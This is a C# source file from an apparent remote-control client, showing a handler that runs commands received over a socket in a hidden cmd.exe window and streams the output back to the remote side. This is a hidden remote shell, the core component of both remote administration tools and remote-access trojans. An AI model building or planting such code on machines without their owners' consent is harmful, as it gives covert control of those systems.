using System;
using System.Diagnostics;
using RemoteControl.Protocals;

namespace RemoteControl.Client.Handlers
{
    class RequestCommandHandler : IRequestHandler
    {
        private Process _cmd;
        public void Handle(SocketSession session, ePacketType reqType, object reqObj)
        {
            var req = reqObj as RequestCommand;
            StartClientCmd(session, req);
        }

        private void StartClientCmd(SocketSession session, RequestCommand req)
        {
            if (_cmd == null)
            {
                InitCommandProcess(session);
            }
            _cmd.StandardInput.WriteLine(req.Command);
            if (req.Command.Trim().ToLower() == "exit")
            {
                _cmd = null;
            }
        }

        private void InitCommandProcess(SocketSession session)
        {
            _cmd = new Process();
            _cmd.StartInfo.FileName = "cmd.exe";
            _cmd.StartInfo.CreateNoWindow = true;
            _cmd.StartInfo.UseShellExecute = false;
            _cmd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            _cmd.StartInfo.RedirectStandardError = true;
            _cmd.StartInfo.RedirectStandardInput = true;
            _cmd.StartInfo.RedirectStandardOutput = true;
            _cmd.OutputDataReceived += (o, args) =>
            {
                DoResponse(session, args.Data);
            };
            _cmd.ErrorDataReceived += (o, args) =>
            {
                DoResponse(session, args.Data);
            };
            _cmd.Start();
            _cmd.BeginOutputReadLine();
            _cmd.BeginErrorReadLine();
        }

        private void DoResponse(SocketSession session, string content)
        {
            var resp = new ResponseCommand();
            try
            {
                resp.CommandResponse = content;
            }
            catch (Exception ex)
            {
                resp.Result = false;
                resp.Message = ex.ToString();
                resp.Detail = ex.StackTrace.ToString();
            }
            session.Send(ePacketType.PACKET_COMMAND_RESPONSE, resp);
        }
    }
}
